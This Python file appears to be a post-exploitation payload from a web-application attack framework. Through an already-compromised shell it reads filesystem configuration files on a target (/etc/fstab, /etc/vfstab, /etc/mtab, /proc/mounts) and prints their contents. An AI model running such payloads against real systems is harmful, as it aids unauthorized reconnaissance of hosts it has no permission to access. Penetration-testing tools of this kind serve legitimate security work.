import re
from plugins.attack.payloads.base_payload import base_payload

class filesystem(base_payload):
    '''
    This payload shows filesystem info.
    '''
    def api_read(self):
        result = {}
        files = []

        files.append('/etc/fstab')
        files.append('/etc/vfstab')
        files.append('/etc/mtab')
        files.append('/proc/mounts')

        for file in files:
            content = self.shell.read(file)
            if content:
                result.update({file:content})
        return result

    def run_read(self):
        hashmap = self.api_read()
        result = []
        if hashmap:
            result.append('Filesystem')
            for file, content in hashmap.iteritems():
                result.append('-------------------------')
                result.append(file)
                result.append('-------------------------')
                result.append(content)
        if result == [ ]:
            result.append('Filesystem configuration files not found.')
        return result
